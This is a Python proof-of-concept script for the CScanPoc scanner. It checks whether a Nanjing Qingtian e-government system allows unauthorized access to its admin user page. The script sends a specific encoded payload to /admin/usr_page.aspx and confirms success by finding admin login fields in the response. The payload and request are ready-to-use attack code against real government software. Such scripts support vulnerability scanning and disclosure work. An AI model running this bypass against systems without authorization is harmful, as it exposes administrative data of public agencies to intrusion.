# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Skynj_0009'  # 平台漏洞编号，留空
    name = '南京擎天政务系统越权'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-02-04'  # 漏洞公布时间
    desc = '''
        南京擎天政务系统 /admin/usr_page.aspx?q= 越权。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=081902
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '擎天政务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '790e8b1d-62f3-44f3-b9c8-e910966e7977'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            payload = '/admin/usr_page.aspx?q=%C2%97%C3%BF%C3%81%C2%AC%C3%9C%C3%A5%C2%82%C3%88%C2%98%C3%85%C2%9B%C2%98%C3%86'
            verify_url = url + payload
            code, head, res, errcode, _ = hh.http(verify_url)
            if code == 200 and 'Ctr_Prefix' in res and "Ctr_Loginnam" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
